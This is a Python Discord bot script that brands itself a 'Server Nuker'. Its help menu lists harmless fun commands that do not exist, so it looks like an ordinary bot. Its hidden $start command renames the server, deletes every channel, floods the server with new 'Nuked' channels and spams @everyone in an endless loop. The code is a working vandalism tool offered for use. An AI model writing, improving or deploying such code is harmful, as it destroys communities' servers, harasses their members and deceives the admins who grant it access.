import discord
import random
import os
from discord.ext import commands

BOT_PREFIX = "$"
channel_names = ["Nuked"]
SKIP_BOTS = False

bot = commands.Bot(command_prefix=BOT_PREFIX, case_insensitive=True)
bot.remove_command('Help')

token = "ENTER TOKEN HERE"

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
        colour=discord.Colour.red(),
    )

    embed.set_author(name="NORBITE")
    embed.add_field(name="UNKOWN ERROR :thinking:", value="Type `$Help` For A List Of Commands.", inline=True)

    await ctx.send(embed=embed)

print("[+] Loading Nuker...")

@bot.event
async def on_ready():
    os.system('cls')                                                        
    print("""{}

    ███████╗██╗   ██╗██████╗  ██████╗ ███████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ███████╗██║   ██║██║  ██║██║   ██║███████╗    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ╚════██║██║   ██║██║  ██║██║   ██║╚════██║    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ███████║╚██████╔╝██████╔╝╚██████╔╝███████║    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                              
{}\n\t[+] Welcome To Sudos's Server Nuker (•◡ •) /\n\t[+] Nuker Loaded!\n\t[+] Type '$start' In The Server To Nuke\n\t[+] Subscribe To Sudo On YT\n{}""".format("="*150,"="*150,"="*150))

@bot.command()
async def Help(ctx):
    await ctx.message.delete()

    embed = discord.Embed(
        title="NORBITE HELP",
    )

    embed.add_field(name="MAIN", value="```$Avatar [user]\n$Bonk [user]\n$Art\n$Pog\n$Cute\n$Meme\n$Random-Num\n$Dice-Roll\n$Fun-Fact\n$Coin-Flip```", inline=False)
    embed.add_field(name="MISC", value="```$Who-Is [user]\n$Ping\n$Server-Info```", inline=False)

    await ctx.send(embed=embed)

@bot.command(pass_content=True)
async def start(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    await ctx.guild.edit(name="BEAMED")
    print("[+] Server named changed")

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    print("[+] All channels have been deleted")

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
        for channel in guild.text_channels:
            for i in range(30):
                await guild.create_text_channel(random.choice(channel_names))
    print("[+] New channels have been made")

    print("[+] Spamming server")
    while True:
        for channel in guild.text_channels:
            await channel.send("@everyone L Admins")

bot.run(token)